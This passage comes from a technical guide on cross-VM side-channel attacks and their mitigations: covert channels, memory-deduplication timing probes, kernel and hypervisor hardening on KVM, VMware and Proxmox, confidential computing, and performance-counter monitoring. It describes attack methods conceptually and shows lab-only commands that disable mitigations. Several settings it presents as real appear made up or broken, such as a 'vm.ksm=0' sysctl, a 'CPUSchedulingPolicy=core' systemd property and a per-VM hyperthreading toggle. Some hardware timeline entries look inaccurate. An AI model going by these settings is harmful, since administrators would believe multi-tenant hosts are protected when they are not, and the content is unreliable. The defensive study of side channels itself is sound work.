- Packet reception events (NIC interrupt → network driver → socket buffer)
- Packet sizes (number of cache lines touched in buffer copies)
- TCP state transitions (distinct code paths for SYN, ACK, data, FIN)
- TLS record sizes (helps identify websites being accessed)

**Achieved results:**
- Website fingerprinting at 70%+ accuracy through LLC monitoring
- Distinguish streaming video, web browsing, file download by LLC activity patterns
- Identify specific web pages within a site using traffic pattern analysis

### 4.4 Covert Channel Communication Between VMs

Two colluding VMs (or an attacker exfiltrating data from a compromised VM) establish a covert channel through shared cache:

**LLC covert channel:**
- Sender: to transmit '1', access addresses in a specific cache set; to transmit '0', do nothing
- Receiver: Prime+Probe the set — eviction detected = '1', no eviction = '0'

**Measured bandwidth:**
| Channel | Bandwidth | Error Rate | Reference |
|---------|-----------|------------|-----------|
| LLC Prime+Probe | 100-600 Kbps | 1-5% | Wu et al. (2014) |
| Memory bus contention | 10-100 Kbps | 5-10% | Various |
| TLB covert channel | 50-200 Kbps | 2-8% | Gras et al. (2018) |

These bandwidths are sufficient to exfiltrate cryptographic keys (256 bits) in under a second through the noisiest channel.

### 4.5 VM Deduplication Attacks — Memory Deduplication as Side Channel

**Kernel Same-page Merging (KSM)** in Linux (and equivalent in VMware — Transparent Page Sharing / TPS):

When two VMs have identical memory pages, the hypervisor merges them into a single physical page (copy-on-write). This creates shared memory between VMs — the exact precondition for Flush+Reload.

**Double-edged sword:**
1. **Side channel**: By crafting pages with specific content and timing write faults (CoW), an attacker can determine if the victim VM has a page with identical content. This reveals which programs, libraries, or data the victim uses.
2. **Enables Flush+Reload**: Once pages are merged, the attacker and victim share physical memory, enabling precise Flush+Reload attacks.

**Attack on TPS/KSM:**
```
1. Attacker creates a page identical to a suspected victim page
   (e.g., first page of /usr/bin/openssh)
2. Wait for deduplication (KSM scan interval)
3. Write to the page and measure time:
   - FAST write → page was NOT shared (no CoW needed)
   - SLOW write → page WAS shared (CoW triggered) → victim has this page
```

This reveals which software the victim is running, which libraries are loaded, and even which version.

### 4.6 TLB-Based Attacks Across VMs

The TLB (Translation Lookaside Buffer) caches virtual-to-physical address translations. On CPUs with shared L2 TLB or when VPID/ASID space is exhausted:

**TLBbleed (Gras et al., 2018)**: Demonstrates cross-hyperthread TLB information leakage on Intel CPUs. By monitoring TLB set contention, an attacker on one hyperthread determines which virtual pages the victim on the sibling hyperthread is accessing.

**Impact**: Reveals memory access patterns at page granularity (4KB/2MB) rather than cache line granularity (64B), but sufficient for many attacks on crypto implementations.

---

## 5. Mitigations — Hardware and Microcode

### 5.1 Intel Mitigations

Intel has released multiple mitigation mechanisms through microcode updates and new CPU features:

| Mitigation | Purpose | Mechanism |
|-----------|---------|-----------|
| IBRS (Indirect Branch Restricted Speculation) | Spectre v2 | Prevents lower-privilege predictions from affecting higher-privilege execution |
| eIBRS (Enhanced IBRS) | Spectre v2 (hardware) | Automatic IBRS without repeated MSR writes; predictions isolated by privilege level |
| IBPB (Indirect Branch Prediction Barrier) | Spectre v2 | Flush BTB/BHB on context switch; prevents cross-process/VM prediction poisoning |
| STIBP (Single Thread Indirect Branch Predictors) | Spectre v2 cross-HT | Prevent sibling hyperthread from influencing predictions |
| SSBD (Speculative Store Bypass Disable) | Spectre v4 | Prevent speculative store bypass |
| VERW / MD_CLEAR | MDS | Clear microarchitectural buffers (LFB, store buffer) |
| L1D_FLUSH | L1TF | Flush L1 data cache on VM entry |
| TSX_DISABLE | TAA | Disable TSX to prevent transactional async abort attacks |
| RRSBA_DIS_S | BHI | Disable alternate RSB predictions in supervisor mode |
| GDS_NO / GDS_MITIGATION | Downfall | Microcode mitigation for gather data sampling |

**Verification:**

```bash
# Check CPU vulnerability status
grep -r . /sys/devices/system/cpu/vulnerabilities/

# Check available mitigation features (CPU flags)
grep -o 'ibrs\|ibpb\|stibp\|ssbd\|md_clear\|flush_l1d\|arch_capabilities' /proc/cpuinfo | sort -u

# Check MSR capabilities (requires msr-tools)
rdmsr 0x10a  # IA32_ARCH_CAPABILITIES
```

### 5.2 AMD Mitigations

| Mitigation | Purpose | Generations |
|-----------|---------|-------------|
| IBPB | Spectre v2 | Zen 1+ (microcode) |
| IBRS (AMD definition) | Spectre v2 | Zen 3+ (hardware, called "Automatic IBRS") |
| SSBD | Spectre v4 | Zen 1+ |
| Predictive Store Forwarding Disable | PSF side channel | Zen 3+ |
| BP_SPEC_REDUCE | SRSO/Inception | Zen 1-4 (microcode) |
| SRSO_NO | SRSO | Zen 4+ (hardware) |

**AMD-specific considerations:**
- AMD CPUs were not affected by Meltdown (different L1D permission handling)
- AMD's branch predictors are generally better isolated between security contexts
- AMD Zen 3+ implements automatic IBRS without performance impact
- SRSO/Inception is AMD-specific (RSB/RAS architecture difference)

```bash
# Check AMD-specific features
grep -o 'ibpb\|ibrs\|stibp\|ssbd\|amd_ssbd\|virt_ssbd\|ibrs_enhanced' /proc/cpuinfo | sort -u

# AMD-specific MSRs
rdmsr 0xc0011029  # DE_CFG (contains LFENCE serializing bit)
```

### 5.3 ARM Mitigations

| Mitigation | Feature ID | Purpose |
|-----------|-----------|---------|
| CSV2 (Cache Speculation Variant 2) | ID_AA64PFR0_EL1.CSV2 | Branch predictor isolation |
| SSBS (Speculative Store Bypass Safe) | ID_AA64PFR1_EL1.SSBS | Per-context speculative store control |
| CSV3 | ID_AA64PFR0_EL1.CSV3 | Full Meltdown immunity |

### 5.4 Hardware Generations and Native Fixes

**Intel timeline:**

| Generation | Codename | Native Fixes |
|-----------|----------|-------------|
| 6th-8th Gen | Skylake, Kaby Lake, Coffee Lake | No hardware fixes; all mitigations via microcode |
| 9th Gen (some) | Whiskey Lake | Hardware Meltdown fix |
| 10th Gen | Ice Lake (client) | eIBRS, hardware MDS fix on some SKUs |
| 11th Gen | Tiger Lake | MDS fix, TAA fix |
| 12th Gen | Alder Lake | Most mitigations in hardware; IBRS_ALL |
| 13th Gen | Raptor Lake | BHI mitigation via microcode still needed |
| 14th Gen | Meteor Lake | Extensive in-hardware fixes |

**AMD timeline:**

| Generation | Codename | Key Fixes |
|-----------|----------|-----------|
| Zen 1 | Ryzen 1000/EPYC 7001 | Microcode-only mitigations |
| Zen 2 | Ryzen 3000/EPYC 7002 | SSBD improvements |
| Zen 3 | Ryzen 5000/EPYC 7003 | Automatic IBRS, PSF control |
| Zen 4 | Ryzen 7000/EPYC 9004 | SRSO_NO on some models, improved isolation |

### 5.5 Performance Impact of Mitigations

**Benchmark summary by workload type:**

| Workload | Mitigation Set | Performance Loss |
|----------|---------------|-----------------|
| Kernel-intensive (syscalls, I/O) | KPTI + retpoline + IBPB | 15-30% |
| Database (PostgreSQL, MySQL) | Full mitigations | 10-20% |
| Compute-bound (HPC, ML training) | Full mitigations | 2-5% |
| Virtualized (VM entry/exit heavy) | L1D flush + IBPB + MD_CLEAR | 10-25% |
| Networking (packet processing) | Full mitigations | 15-25% |
| SMT disabled | N/A | 20-30% (lost throughput) |

**Measurement script:**

```bash
#!/bin/bash
# measure_mitigation_impact.sh
# Compare performance with and without mitigations
# Run as root on an isolated test system

BENCHMARK_CMD="sysbench cpu --cpu-max-prime=20000 run"

echo "=== Current mitigation status ==="
cat /sys/devices/system/cpu/vulnerabilities/*

echo ""
echo "=== Running benchmark with current mitigations ==="
$BENCHMARK_CMD 2>&1 | grep "events per second"

echo ""
echo "=== Kernel parameters (current) ==="
cat /proc/cmdline

echo ""
echo "=== Per-vulnerability status ==="
for vuln in /sys/devices/system/cpu/vulnerabilities/*; do
    printf "%-30s %s\n" "$(basename $vuln):" "$(cat $vuln)"
done

echo ""
echo "=== To test with mitigations disabled (DANGEROUS — lab only): ==="
echo "Add to kernel cmdline: mitigations=off"
echo "Reboot, re-run this script, and compare."
echo ""
echo "=== To test specific mitigations: ==="
echo "  nospectre_v1"
echo "  nospectre_v2"
echo "  nopti (disables KPTI/Meltdown)"
echo "  mds=off"
echo "  tsx_async_abort=off"
echo "  l1tf=off"
echo "  nosmt (disable hyperthreading)"
```

---

## 6. Mitigations — Software and Hypervisor

### 6.1 Linux Kernel Mitigations

The Linux kernel implements comprehensive side-channel mitigations controllable via boot parameters:

**KPTI (Kernel Page Table Isolation):**

Separates kernel and user page tables. When in user mode, the page tables do not map kernel memory, preventing Meltdown-style attacks from reading kernel contents.

```bash
# Enable (default on vulnerable CPUs)
# Boot parameter:
pti=on

# Disable (lab/benchmark only):
nopti

# Verify status:
dmesg | grep -i "page table isolation"
cat /sys/devices/system/cpu/vulnerabilities/meltdown
```

**Retpoline:**

Replaces indirect branches (jmp/call through register) with a "return trampoline" that captures speculative execution in an infinite loop, preventing Spectre v2 gadget execution.

```bash
# Check if retpoline is active:
dmesg | grep -i retpoline
cat /sys/devices/system/cpu/vulnerabilities/spectre_v2

# Kernel parameter to control Spectre v2 mitigation:
spectre_v2=on          # Full mitigation (retpoline or IBRS depending on hardware)
spectre_v2=retpoline   # Force retpoline
spectre_v2=ibrs        # Force IBRS
spectre_v2=eibrs       # Use enhanced IBRS (hardware)
spectre_v2=off         # Disable (DANGEROUS)
```

**Full kernel parameter reference for side-channel mitigations:**

```bash
# /etc/default/grub — GRUB_CMDLINE_LINUX additions for security-hardened systems

# Master switch (NOT RECOMMENDED for production):
# mitigations=off   ← disables ALL mitigations

# Individual controls:
spectre_v1=on                    # Bounds check bypass mitigation
spectre_v2=on                    # Branch target injection mitigation
spectre_v2_user=on               # User-space Spectre v2 mitigation
pti=on                           # Page Table Isolation (Meltdown)
mds=full                         # Microarchitectural Data Sampling
mds=full,nosmt                   # MDS + disable hyperthreading
tsx_async_abort=full             # TSX Async Abort
tsx_async_abort=full,nosmt       # TAA + disable hyperthreading
l1tf=full                        # L1 Terminal Fault (Foreshadow)
l1tf=full,force                  # L1TF + force flush on all VM entries
mmio_stale_data=full             # MMIO stale data mitigation
retbleed=auto                    # Retbleed mitigation
spec_store_bypass_disable=on     # Spectre v4 / SSBD
gather_data_sampling=force       # Downfall / GDS mitigation
srso=auto                        # SRSO / Inception (AMD)
spec_rstack_overflow=safe-ret    # SRSO safe-return mitigation
nosmt                            # Disable Simultaneous Multithreading

# Apply changes:
# sudo update-grub && sudo reboot
```

### 6.2 KVM-Specific Mitigations

KVM (Kernel-based Virtual Machine) implements several mechanisms specific to VM isolation:

**L1TF (Foreshadow) mitigation:**

L1TF allows a VM to read L1D cache contents belonging to another VM or the hypervisor. KVM's mitigation flushes L1D on every VM entry.

```bash
# L1TF mitigation modes:
# /sys/module/kvm_intel/parameters/vmentry_l1d_flush
cat /sys/module/kvm_intel/parameters/vmentry_l1d_flush

# Values:
# "always"  — flush on every VM entry (most secure, highest overhead)
# "cond"    — conditional flush (flush when switching between VMs)
# "never"   — never flush (INSECURE in multi-tenant)

# Set at runtime:
echo "always" > /sys/module/kvm_intel/parameters/vmentry_l1d_flush

# Or via module parameter:
# /etc/modprobe.d/kvm.conf
options kvm_intel vmentry_l1d_flush=always
```

**SMT control:**

```bash
# Disable SMT system-wide (eliminates cross-HT attacks):
echo off > /sys/devices/system/cpu/smt/control

# Check current SMT state:
cat /sys/devices/system/cpu/smt/active    # 0 or 1
cat /sys/devices/system/cpu/smt/control   # on, off, forceoff, notsupported

# Boot parameter:
nosmt
# or
nosmt=force  # cannot be re-enabled at runtime
```

**VM process isolation via cgroups:**

```bash
# Restrict a VM (qemu process) to specific CPU cores:
# This prevents a sensitive VM from sharing a core with untrusted VMs

# Using systemd cgroup:
systemctl set-property qemu-<vmid>.scope AllowedCPUs=0-3

# Using cgroups v2 directly:
echo "0-3" > /sys/fs/cgroup/machine.slice/qemu-<vmid>.scope/cpuset.cpus
```

### 6.3 VMware Mitigations

VMware ESXi implements side-channel-aware scheduling and isolation:

**Side-Channel Aware Scheduler (SCAv1, SCAv2):**

```
# ESXi advanced settings:

# SCAv1 — prevents co-scheduling of VMs from different security contexts
#          on sibling hyperthreads
/CPUID/CoresPerSocket = <match physical topology>
VMkernel.Boot.hyperthreadingMitigation = true

# SCAv2 — more granular; considers VM groups
VMkernel.Boot.hyperthreadingMitigationIntraGroup = true
```

**VMware per-VM settings (.vmx):**

```
# Disable hyperthreading for this VM (VM sees only one thread per core):
cpuid.coresPerSocket = "1"

# Prevent inter-VM scheduling on same core:
sched.cpu.latencySensitivity = "high"

# Force L1D flush on VM entry (requires ESXi patches):
monitor.l1dflush = "true"
```

### 6.4 Proxmox VE Mitigations

Proxmox VE runs on top of Debian with KVM/QEMU. Mitigation configuration combines kernel parameters, KVM module options, and per-VM settings.

**Kernel parameters for Proxmox host:**

```bash
# /etc/default/grub on Proxmox VE host
GRUB_CMDLINE_LINUX="spectre_v2=on pti=on l1tf=full,force \
  mds=full nosmt spec_store_bypass_disable=on \
  tsx_async_abort=full kvm_intel.vmentry_l1d_flush=always"

# After editing:
update-grub
reboot
```

**CPU flags passthrough to guests:**

```bash
# In /etc/pve/qemu-server/<vmid>.conf:

# Option 1: Pass host CPU model (exposes all flags including mitigation features)
cpu: host

# Option 2: Specific model with flags
cpu: x86-64-v3,+pcid,+invpcid,+spec-ctrl,+ssbd,+md-clear,+stibp

# PCID (Process Context Identifiers) — reduces KPTI overhead:
# With PCID, KPTI doesn't require full TLB flush on user↔kernel transition
cpu: host,+pcid,+invpcid

# Flags explained:
# +pcid      — expose PCID to guest (reduces KPTI overhead inside guest)
# +invpcid   — expose INVPCID instruction
# +spec-ctrl — expose IA32_SPEC_CTRL MSR (guest can set IBRS/STIBP/SSBD)
# +ssbd      — Speculative Store Bypass Disable
# +md-clear  — guest can use VERW for MDS mitigation
# +stibp     — Single Thread Indirect Branch Predictors
# +ibpb      — IBPB support exposed to guest
```

**Verifying guest-visible mitigations from inside the VM:**

```bash
# Inside the guest VM:
cat /sys/devices/system/cpu/vulnerabilities/spectre_v1
cat /sys/devices/system/cpu/vulnerabilities/spectre_v2
cat /sys/devices/system/cpu/vulnerabilities/meltdown
cat /sys/devices/system/cpu/vulnerabilities/l1tf
cat /sys/devices/system/cpu/vulnerabilities/mds
cat /sys/devices/system/cpu/vulnerabilities/tsx_async_abort
cat /sys/devices/system/cpu/vulnerabilities/mmio_stale_data
cat /sys/devices/system/cpu/vulnerabilities/retbleed
cat /sys/devices/system/cpu/vulnerabilities/spec_rstack_overflow
cat /sys/devices/system/cpu/vulnerabilities/gather_data_sampling
```

### 6.5 Core Scheduling — Preventing Cross-HT Attacks

Linux 5.14+ introduces **core scheduling** which ensures that only threads from the same security context (same VM, same cgroup) run simultaneously on sibling hyperthreads of the same physical core.

**How it works:**
- Each task/cgroup gets a "cookie" (security context tag)
- The scheduler only co-schedules tasks with matching cookies on the same core
- If no matching task exists for a sibling HT, it remains idle (or runs idle thread)
- Preserves SMT throughput for same-VM workloads while preventing cross-VM HT attacks

**Configuration:**

```bash
# Enable core scheduling (compile-time: CONFIG_SCHED_CORE=y)
# Check if available:
grep CONFIG_SCHED_CORE /boot/config-$(uname -r)

# Assign core scheduling cookies via prctl:
# PR_SCHED_CORE_CREATE = create new cookie for the process
# PR_SCHED_CORE_SHARE_TO = share cookie to another process

# For QEMU/KVM VMs, systemd integration:
# Each VM's QEMU process gets a unique cookie automatically if:
systemctl set-property machine-qemu*.scope CPUSchedulingPolicy=core

# Verify core scheduling is active:
cat /sys/kernel/debug/sched/core_sched

# Proxmox-specific: ensure all QEMU processes are in separate cgroups
# (default behavior — each VM is its own machine.slice unit)
```

### 6.6 CPU Pinning for Isolation

Strict CPU affinity ensures sensitive VMs never share physical cores with untrusted workloads:

```bash
# Proxmox: pin VM 100 to cores 0-3 exclusively
# /etc/pve/qemu-server/100.conf:
affinity: 0-3
cores: 4

# Ensure no other VM uses these cores:
# VM 101 (untrusted):
affinity: 4-7
cores: 4

# System/host processes restricted to remaining cores:
# /etc/systemd/system/isolate-host.service (or via tuned/irqbalance config)
# isolcpus=0-7 (in kernel cmdline, isolates from general scheduler)
```

---

## 7. Mitigations — VM Configuration

### 7.1 CPU Topology — Exposing Correct Topology to Guest

Misconfigured virtual CPU topology can inadvertently weaken isolation or prevent guest-side mitigations from working correctly.

```bash
# Proxmox /etc/pve/qemu-server/<vmid>.conf

# CORRECT: Expose topology matching physical layout
# If physical host has 2 sockets × 8 cores × 2 threads:
sockets: 1
cores: 4
# Guest sees 1 socket, 4 cores (total 4 vCPUs)

# IMPORTANT: If using SMT on host, decide whether guest sees threads:
# Option A: Expose HT to guest (guest can apply its own STIBP):
sockets: 1
cores: 2
# QEMU flag: -smp 4,sockets=1,cores=2,threads=2
# Requires: cpu: host (to expose HT topology via CPUID)

# Option B: Hide HT from guest (simpler, fewer guest-side concerns):
sockets: 1
cores: 4
# Guest sees 4 independent cores, unaware of HT
```

### 7.2 Disabling SMT per VM

For high-security VMs that must be protected from cross-HT attacks:

```bash
# Approach 1: CPU pinning to one thread per core
# Pin VM to physical cores 0,2,4,6 (only first HT of each core)
# (Assumes cores 0/1 are HT siblings, 2/3 are siblings, etc.)
affinity: 0,2,4,6

# Approach 2: System-wide nosmt (sacrifice throughput):
# Kernel cmdline: nosmt

# Approach 3: Core scheduling (best balance)
# See section 6.5
```

### 7.3 Memory Deduplication — KSM Disable for Security-Sensitive VMs

KSM (Kernel Same-page Merging) merges identical pages across VMs, creating shared physical memory that enables Flush+Reload.

```bash
# Check KSM status:
cat /sys/kernel/mm/ksm/run           # 1 = active, 0 = stopped
cat /sys/kernel/mm/ksm/pages_shared  # currently deduplicated pages
cat /sys/kernel/mm/ksm/pages_sharing # pages pointing to shared copies

# Disable KSM entirely:
echo 0 > /sys/kernel/mm/ksm/run

# Unmerge already-merged pages:
echo 2 > /sys/kernel/mm/ksm/run   # stop and unmerge
# Wait for unmerge to complete:
watch cat /sys/kernel/mm/ksm/pages_shared  # wait until 0

# Persistent disable (Proxmox):
# /etc/default/ksm
KSM_ENABLED=0

# Or via systemd:
systemctl disable ksm
systemctl disable ksmtuned

# Per-VM approach (QEMU): disable mergeable on memory backend
# In QEMU command line (not directly in Proxmox conf):
# -object memory-backend-ram,id=ram0,size=4G,merge=off
# In Proxmox, with custom QEMU args (hookscript):
args: -object memory-backend-ram,id=ram0,size=4G,merge=off \
      -machine memory-backend=ram0
```

**Proxmox-specific**: By default, Proxmox enables KSM. For security-sensitive multi-tenant deployments, disable it:

```bash
# Permanently disable on Proxmox:
cat > /etc/sysctl.d/99-disable-ksm.conf << 'EOF'
# Disable KSM for security (prevents cross-VM Flush+Reload)
vm.ksm=0
EOF

sysctl -p /etc/sysctl.d/99-disable-ksm.conf
echo 2 > /sys/kernel/mm/ksm/run
```

### 7.4 Huge Pages — Reducing TLB Sharing

Transparent Huge Pages (THP) and explicit huge pages affect side-channel attacks:

- **Huge pages reduce TLB pressure** but create larger contiguous physical mappings that simplify physical address guessing for Prime+Probe
- **Static huge pages** (pre-allocated) are not merged by KSM
- **Per-VM huge pages** improve performance while avoiding deduplication risk

```bash
# Allocate huge pages for VMs (2MB pages):
echo 4096 > /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages

# Proxmox VM config — use huge pages:
# /etc/pve/qemu-server/<vmid>.conf
hugepages: 1048576  # 1GB pages (if supported)
# or
hugepages: 2       # 2MB pages

# Verify allocation:
cat /proc/meminfo | grep -i huge

# Disable THP (Transparent Huge Pages) on the host to avoid
# uncontrolled physical memory layout:
echo never > /sys/kernel/mm/transparent_hugepage/enabled
echo never > /sys/kernel/mm/transparent_hugepage/defrag
```

### 7.5 CPU Affinity — Dedicated Cores for Sensitive Workloads

```bash
# Proxmox: complete isolation example for a sensitive VM
# Physical host: 32 cores (16 physical × 2 HT), 2 NUMA nodes

# === Host configuration ===
# Isolate cores 0-7 (NUMA node 0) from general scheduling:
# Kernel cmdline:
isolcpus=0-7 nohz_full=0-7 rcu_nocbs=0-7

# === Sensitive VM (ID 100) ===
# /etc/pve/qemu-server/100.conf:
cores: 8
affinity: 0-7
numa: 1
hugepages: 2
cpu: host,+pcid,+invpcid,+spec-ctrl,+ssbd,+md-clear

# === Untrusted VMs (ID 200+) ===
# /etc/pve/qemu-server/200.conf:
cores: 4
affinity: 16-23
cpu: host,+pcid,+spec-ctrl,+ssbd,+md-clear
```

### 7.6 NUMA-Aware Placement

NUMA (Non-Uniform Memory Access) architecture means cross-socket memory access is slower. NUMA-aware placement also provides some physical isolation:

- VMs on different NUMA nodes do NOT share L3/LLC (each socket has its own LLC)
- Cross-NUMA VM placement eliminates LLC side channels between the VMs
- Memory allocated on the local NUMA node avoids cross-socket snooping

```bash
# Check NUMA topology:
numactl --hardware
lscpu | grep -i numa

# Force VM to a specific NUMA node (Proxmox):
# /etc/pve/qemu-server/<vmid>.conf:
numa: 1
# QEMU will attempt NUMA-local memory allocation

# Explicit NUMA node binding (via hookscript):
# numactl --cpunodebind=0 --membind=0 qemu-system-x86_64 ...

# Verify NUMA allocation:
numastat qemu-system-x86_64
```

### 7.7 CPU Flags — Exposing/Hiding Mitigation Capabilities to Guests

The decision of which CPU flags to expose to guests is critical:

```bash
# SECURE: Expose mitigation flags so guest can protect itself
cpu: host,+pcid,+invpcid,+spec-ctrl,+ssbd,+md-clear,+stibp,+ibpb

# MIGRATABLE: Use a defined CPU model with specific flags
# (allows live migration between hosts with different hardware)
cpu: x86-64-v3,+pcid,+spec-ctrl,+ssbd,+md-clear

# HIDE FLAGS (specialized, e.g., for testing):
cpu: host,-hypervisor    # hide hypervisor flag (stealth)
cpu: host,-spec-ctrl     # don't expose spec-ctrl to guest
                          # (guest cannot set IBRS/SSBD itself —
                          #  host must enforce)

# VERIFY from inside guest:
grep flags /proc/cpuinfo | head -1 | tr ' ' '\n' | grep -E 'pcid|invpcid|ssbd|spec|md_clear|stibp|ibpb'
```

---

## 8. Confidential Computing

### 8.1 AMD SEV — Secure Encrypted Virtualization

AMD SEV encrypts VM memory with a per-VM AES key managed by a dedicated security processor (AMD-SP/PSP). The hypervisor cannot read guest memory in plaintext.

**Architecture:**

```
┌─────────────────────────────────────────────────────┐
│  Guest VM                                            │
│  ┌──────────────────────────────────────────────┐   │
│  │  Memory encrypted with per-VM key             │   │
│  │  Key managed by AMD Secure Processor (ASP)    │   │
│  │  Hypervisor CANNOT read plaintext             │   │
│  └──────────────────────────────────────────────┘   │
├─────────────────────────────────────────────────────┤
│  Hypervisor/Host                                     │
│  Can manage VM lifecycle but CANNOT:                 │
│  - Read guest memory (encrypted)                     │
│  - Inject code into guest memory                     │
│  - Extract encryption keys                           │
└─────────────────────────────────────────────────────┘
```

**SEV generations:**

| Version | Feature | Protection |
|---------|---------|-----------|
| SEV | Memory encryption | Memory bus snooping, cold boot attacks |
| SEV-ES (Encrypted State) | + Register state encrypted | Hypervisor cannot read/modify guest registers during VMEXIT |
| SEV-SNP (Secure Nested Paging) | + Memory integrity + attestation | Prevents replay attacks, memory remapping, integrity verification |

**Enabling SEV-SNP on Proxmox/KVM:**

```bash
# Requirements:
# - AMD EPYC processor (Naples+ for SEV, Milan+ for SEV-SNP)
# - BIOS: Enable SEV, SEV-ES, SEV-SNP, SME in BIOS settings
# - Linux 5.19+ kernel for SEV-SNP host support

# Kernel parameters:
# /etc/default/grub
GRUB_CMDLINE_LINUX="mem_encrypt=on kvm_amd.sev=1 kvm_amd.sev_es=1 kvm_amd.sev_snp=1"

# Verify SEV availability:
dmesg | grep -i sev
cat /sys/module/kvm_amd/parameters/sev
cat /sys/module/kvm_amd/parameters/sev_es
cat /sys/module/kvm_amd/parameters/sev_snp

# Check number of available ASIDs (max concurrent SEV VMs):
cat /sys/fs/cgroup/misc.capacity  # or
dmesg | grep "SEV supported:"

# Launch SEV-SNP VM (QEMU command):
qemu-system-x86_64 \
  -machine q35,confidential-guest-support=sev0 \
  -object sev-snp-guest,id=sev0,cbitpos=51,reduced-phys-bits=1,\
policy=0x30000,guest-visible-workarounds=... \
  -cpu EPYC-v4 \
  ...
```

### 8.2 Intel TDX — Trust Domain Extensions

Intel TDX creates isolated "Trust Domains" (TDs) with hardware-enforced memory encryption and integrity protection.

**Key components:**
- **SEAM (Secure Arbitration Mode)**: New CPU mode for TDX module execution
- **TDCS (Trust Domain Control Structure)**: Per-TD metadata managed by TDX module
- **Memory encryption**: AES-128-XTS per-TD with key in hardware
- **Integrity protection**: Integrity tree prevents replay and corruption

**TDX vs SEV-SNP comparison:**

| Feature | AMD SEV-SNP | Intel TDX |
|---------|-------------|-----------|
| Memory encryption | AES-128 (SME engine) | AES-128-XTS (MKTME) |
| Integrity | RMP (Reverse Map Table) | Memory Integrity Tree |
| Attestation | PSP-based | SGX/TDX QE-based |
| Register protection | SEV-ES (encrypted VMCB) | TD-VMCS (inaccessible to host) |
| Min. CPU generation | EPYC 7003 (Milan) | Sapphire Rapids |
| Nested virtualization | Limited | Supported (TDX 2.0) |

### 8.3 Intel SGX — Software Guard Extensions

SGX creates hardware-protected memory enclaves within a process address space. While not a VM-level protection, SGX enclaves can protect sensitive computations from a compromised hypervisor.

**Limitations in VM context:**
- SGX-inside-VM requires hypervisor cooperation (EPC virtualization)
- SGX deprecated in consumer CPUs (12th gen+), remains in Xeon
- Subject to side-channel attacks itself (controlled-channel attacks, L1TF on SGX)
- EPC size limits (128MB-512MB typical)

### 8.4 ARM CCA — Confidential Compute Architecture

ARM's approach to confidential computing for ARMv9:

- **Realms**: Protected execution environments (similar to TDX Trust Domains)
- **RME (Realm Management Extension)**: New security state in ARM exception model
- **4 worlds**: Normal, Secure, Realm, Root
- **Realm memory**: Encrypted and integrity-protected
- **Granule Protection Table (GPT)**: Controls which world can access each memory granule

### 8.5 Attestation — Verifying Confidential VM Integrity

Attestation proves that a confidential VM is running genuine code on genuine hardware with correct security configuration:

```
┌──────────────────────────────────────────────────────────────┐
│  Attestation Flow (AMD SEV-SNP)                               │
│                                                                │
│  1. VM Owner requests attestation report from guest            │
│  2. Guest firmware requests report from AMD-SP via GHCB        │
│  3. AMD-SP generates report containing:                        │
│     - Measurement of initial guest firmware/kernel             │
│     - Current guest policy (migration allowed? debugging?)     │
│     - Hardware TCB version (firmware versions)                 │
│     - Platform info                                            │
│  4. Report signed by AMD-SP key (Versioned Chip Endorsement)   │
│  5. Signature verified against AMD's published root of trust   │
│                                                                │
│  If valid: guest is running expected code on genuine AMD SEV   │
│  hardware with claimed security policy.                        │
└──────────────────────────────────────────────────────────────┘
```

**Verification tools:**

```bash
# AMD SEV-SNP attestation verification:
# Using sev-tool (AMD's reference implementation):
sevtool --ofolder ./report --attestation --verbose

# Using guest kernel interface:
# /dev/sev-guest → ioctl(SNP_GET_REPORT, ...)

# Intel TDX attestation:
# Via TDCALL → TDG.MR.REPORT
# Verify against Intel's PCCS (Provisioning Certification Caching Service)
```

### 8.6 Limitations and Remaining Attack Surface

Confidential computing does NOT eliminate all side-channel attacks:

**Remaining channels even with SEV-SNP/TDX:**
1. **Cache side channels**: Memory encryption does not prevent cache-based timing attacks. The CPU cache holds plaintext (encryption/decryption happens at the memory controller). LLC Prime+Probe still works.
2. **Interrupt-based channels**: The hypervisor controls interrupt injection and can observe/manipulate VM behavior at interrupt granularity.
3. **Page-table based channels**: With SEV (not SNP), the hypervisor controls the nested page tables and can observe page-level access patterns (controlled-channel attacks). SNP's RMP mitigates this partially.
4. **Ciphertext analysis**: Encrypted memory pages can still be observed for write patterns (which pages changed, when).
5. **Performance counters**: If the hypervisor can read performance counters for the guest's execution, side-channel information still leaks.
6. **I/O channels**: Data sent to virtual devices (network, disk) must be decrypted for I/O, creating observation points.
7. **Architectural attacks**: Bugs in the SEV firmware, TDX module, or attestation flow itself (demonstrated: SEVered, CrossLine, CipherLeaks on early SEV without SNP).

**Defense in depth**: Confidential computing is one layer. Combine with:
- Cache partitioning (CAT) for LLC isolation
- Core scheduling for HT protection
- Constant-time cryptographic implementations
- Minimal I/O surface (virtio with bounce buffers, encrypted channels)

---

## 9. Detection and Monitoring

### 9.1 Detecting Side-Channel Attack Attempts

Side-channel attacks produce distinctive patterns in hardware performance counters and system behavior. While detection is inherently probabilistic (no definitive signature exists), monitoring provides defense-in-depth.

**Detection challenges:**
- Side-channel attacks use only legitimate instructions (no exploits, no privilege escalation)
- The CPU behavior they exploit is indistinguishable from normal workload patterns in isolation
- Detection requires establishing baselines and identifying anomalies
- False positive rate must be managed (legitimate workloads create cache pressure too)

### 9.2 Hardware Performance Counters

Modern CPUs expose thousands of performance monitoring events. Key events for side-channel detection:

**Intel PMC events of interest:**

| Event | Umask | Description | Side-Channel Indicator |
|-------|-------|-------------|----------------------|
| MEM_LOAD_RETIRED.L3_MISS | 0x20 | LLC misses | Abnormally high → potential eviction-based attack |
| LLC-LOAD-MISSES | - | LLC load misses | Spike pattern correlating with victim activity |
| OFFCORE_RESPONSE.ALL_READS.L3_MISS.ANY_SNOOP | - | Detailed LLC miss source | Cross-core cache activity |
| BR_MISP_RETIRED.ALL_BRANCHES | 0x00 | Branch mispredictions | Spectre training phase |
| INST_RETIRED.ALL | 0x00 | Instructions retired | Unexplained instruction retirement spikes |
| CYCLE_ACTIVITY.STALLS_L3_MISS | 0x06 | Cycles stalled on LLC miss | Memory access patterns |
| L1D.REPLACEMENT | 0x01 | L1D replacements | Flush+Reload / Evict+Reload activity |
| DTLB-LOAD-MISSES | - | DTLB misses | TLB-based side channel attempts |

**Monitoring script using perf:**

```bash
#!/bin/bash
# monitor_side_channel.sh
# Monitor hardware performance counters for side-channel attack indicators
# Run on the HOST, targeting specific VM (QEMU) processes

VICTIM_PID=${1:-$(pgrep -f "qemu-system.*vmid=100" | head -1)}
DURATION=${2:-60}  # seconds

if [ -z "$VICTIM_PID" ]; then
    echo "Usage: $0 <pid> [duration_seconds]"
    echo "No QEMU process found."
    exit 1
fi

echo "[*] Monitoring PID $VICTIM_PID for $DURATION seconds"
echo "[*] Looking for anomalous cache/branch patterns..."

# Collect baseline counters
